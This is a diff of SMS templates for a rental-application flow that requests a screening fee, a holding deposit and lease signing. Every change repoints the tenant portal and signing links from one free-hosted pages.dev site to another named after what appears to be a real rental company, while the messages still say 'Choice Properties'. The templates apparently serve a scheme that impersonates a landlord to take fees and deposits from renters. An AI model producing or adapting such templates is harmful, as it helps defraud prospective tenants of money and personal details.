@@ -134,7 +134,7 @@ Note: We also dispatched your formal application confirmation to {Email}. If you
 Hello {First_Name}, your $50 application screening fee for {Property_Address} has been received and verified. 
 
 Your official stamped corporate ledger receipt has been generated. You can access your file and view your receipt directly in your resident portal here:
-https://choice-properties-site.pages.dev/tenant/portal.html?app={App_ID}
+https://progress-residential.pages.dev/tenant/portal.html?app={App_ID}
 
 Your full file is now with our underwriting department. We have also emailed a copy of your receipt to {Email} (please check your spam/junk folder if not visible).
 ```
@@ -149,7 +149,7 @@ Congratulations {First_Name}! Your rental application for {Property_Address} has
 Under our reservation protocol, this property is eligible to be held exclusively in your name while we prepare your lease documents. Your holding deposit is 100% credited toward your move-in balance.
 
 Please review your Approval & Reservation Agreement here:
-https://choice-properties-site.pages.dev/tenant/portal.html?app={App_ID}
+https://progress-residential.pages.dev/tenant/portal.html?app={App_ID}
 
 We also sent your official approval packet to {Email}. Please check your inbox and spam folder. Reply to this text to coordinate your reservation holding details.
 ```
@@ -162,7 +162,7 @@ We also sent your official approval packet to {Email}. Please check your inbox a
 Great news {First_Name}! Your reservation holding deposit for {Property_Address} has been verified and posted to your account ledger. 
 
 The home is now officially off the market and secured for your upcoming move-in! Your Stamped Escrow Receipt (#CP-REC-HOLD-{App_ID}) is now available in your portal:
-https://choice-properties-site.pages.dev/tenant/portal.html?app={App_ID}
+https://progress-residential.pages.dev/tenant/portal.html?app={App_ID}
 
 Our leasing team is currently preparing your official Residential Lease Agreement. We have also emailed your escrow statement to {Email} (please check spam if needed).
 ```
@@ -175,7 +175,7 @@ Our leasing team is currently preparing your official Residential Lease Agreemen
 Hello {First_Name}, your official Residential Lease Agreement for {Property_Address} is prepared and ready for electronic signature!
 
 Please review and execute your agreement securely using your signing link:
-https://choice-properties-site.pages.dev/tenant/sign.html?token={Signing_Token}
+https://progress-residential.pages.dev/tenant/sign.html?token={Signing_Token}
 
 A direct signing copy was also dispatched to {Email}. Because this contains formal legal contracts, some email providers filter it—please inspect your spam, junk, or promotions folder. Feel free to text me here once signed!
 ```
@@ -188,7 +188,7 @@ A direct signing copy was also dispatched to {Email}. Because this contains form
 Welcome home, {First_Name}! Your lease for {Property_Address} has been fully countersigned and finalized by Choice Properties management. 
 
 Your complete, executed legal lease package and initial move-in orientation guide are now available in your resident portal:
-https://choice-properties-site.pages.dev/tenant/portal.html?app={App_ID}
+https://progress-residential.pages.dev/tenant/portal.html?app={App_ID}
 
 We also emailed your executed documents to {Email} (check your spam folder if not in primary inbox). Our move-in coordination team will reach out with your key handover protocol as your move-in date approaches!
 ```
@@ -204,7 +204,7 @@ Your electronic lockbox / keypad access code is: [ENTER_CODE]
 (Code activates at 9:00 AM local time).
 
 Please remember to complete your 48-Hour Move-In Condition Checklist in your portal to document initial property condition and protect your deposit:
-https://choice-properties-site.pages.dev/tenant/portal.html?app={App_ID}
+https://progress-residential.pages.dev/tenant/portal.html?app={App_ID}
 
 Full move-in packet and emergency maintenance contacts have been emailed to {Email} (check spam if needed). Welcome to Choice Properties!
 ```
